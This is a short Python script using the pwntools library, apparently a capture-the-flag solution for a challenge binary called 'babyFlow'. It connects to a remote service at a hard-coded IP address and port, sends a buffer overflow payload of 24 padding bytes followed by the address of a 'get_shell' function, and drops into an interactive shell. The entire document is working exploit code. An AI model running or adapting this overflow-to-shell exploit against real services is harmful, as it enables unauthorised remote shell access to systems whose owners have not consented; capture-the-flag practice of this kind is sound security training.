from pwn import *
add = ELF('./babyFlow')
#e = process('./babyFlow')
host = "143.198.219.171"
port = 5000
e = remote(host,port)
offset = 24
payload = b'A'* offset
payload +=p32(add.symbols['get_shell'])
print(add.symbols['get_shell'])
print(payload)
print(e.recvuntil(b'\n'))

e.sendline(payload)

e.interactive()


